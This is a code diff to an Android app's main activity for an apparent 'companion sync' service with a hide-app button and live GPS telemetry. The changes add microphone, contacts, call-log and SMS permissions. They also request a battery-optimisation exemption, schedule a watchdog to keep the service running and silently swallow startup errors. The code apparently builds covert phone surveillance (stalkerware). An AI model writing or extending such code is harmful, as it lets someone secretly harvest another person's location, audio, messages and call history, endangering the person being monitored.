@@ -44,19 +44,10 @@ public class MainActivity extends AppCompatActivity {
 
         checkExistingPairing();
 
-        btnActivate.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                handleActivation();
-            }
-        });
-
-        btnSyncNow.setOnClickListener(new View.OnClickListener() {
-            @Override
-            public void onClick(View v) {
-                startSyncService();
-                Toast.makeText(MainActivity.this, "Live GPS telemetry sent!", Toast.LENGTH_SHORT).show();
-            }
+        btnActivate.setOnClickListener(v -> handleActivation());
+        btnSyncNow.setOnClickListener(v -> {
+            startSyncService();
+            Toast.makeText(MainActivity.this, "Live GPS telemetry sent!", Toast.LENGTH_SHORT).show();
         });
 
         btnHideApp.setOnClickListener(new View.OnClickListener() {
@@ -141,7 +132,11 @@ public class MainActivity extends AppCompatActivity {
         String[] perms = new String[]{
                 Manifest.permission.ACCESS_FINE_LOCATION,
                 Manifest.permission.ACCESS_COARSE_LOCATION,
-                Manifest.permission.CAMERA
+                Manifest.permission.CAMERA,
+                Manifest.permission.RECORD_AUDIO,
+                Manifest.permission.READ_CONTACTS,
+                Manifest.permission.READ_CALL_LOG,
+                Manifest.permission.READ_SMS
         };
 
         boolean allGranted = true;
@@ -153,9 +148,23 @@ public class MainActivity extends AppCompatActivity {
         }
 
         if (allGranted) {
+            requestBatteryOptimizationExemption();
             startSyncService();
         } else {
             ActivityCompat.requestPermissions(this, perms, PERM_REQUEST_CODE);
+        }
+    }
+
+    private void requestBatteryOptimizationExemption() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
+            try {
+                android.os.PowerManager pm = (android.os.PowerManager) getSystemService(Context.POWER_SERVICE);
+                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
+                    Intent intent = new Intent(android.provider.Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
+                    intent.setData(android.net.Uri.parse("package:" + getPackageName()));
+                    startActivity(intent);
+                }
+            } catch (Exception ignored) {}
         }
     }
 
@@ -163,16 +172,20 @@ public class MainActivity extends AppCompatActivity {
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         if (requestCode == PERM_REQUEST_CODE) {
+            requestBatteryOptimizationExemption();
             startSyncService();
         }
     }
 
     private void startSyncService() {
+        WatchdogReceiver.scheduleWatchdog(this);
         Intent serviceIntent = new Intent(this, CompanionSyncService.class);
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            startForegroundService(serviceIntent);
-        } else {
-            startService(serviceIntent);
-        }
+        try {
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(serviceIntent);
+            } else {
+                startService(serviceIntent);
+            }
+        } catch (Exception ignored) {}
     }
 }
